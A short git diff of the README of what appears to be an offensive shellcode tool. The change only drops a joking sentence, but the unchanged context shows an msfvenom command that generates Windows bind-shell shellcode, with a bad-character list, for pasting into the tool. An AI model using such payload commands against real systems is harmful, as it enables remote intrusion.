@@ -22,7 +22,7 @@ pip install pycrypto
 
 ## Generating Shellcode
 
-Example msfvenom commands to generate shellcode.  Just paste these into the file which you'll edit after downloading.  'Cause you're an awesome hacker like that.
+Example msfvenom commands to generate shellcode.  Just paste these into the file which you'll edit after downloading.
 
 ```
 msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
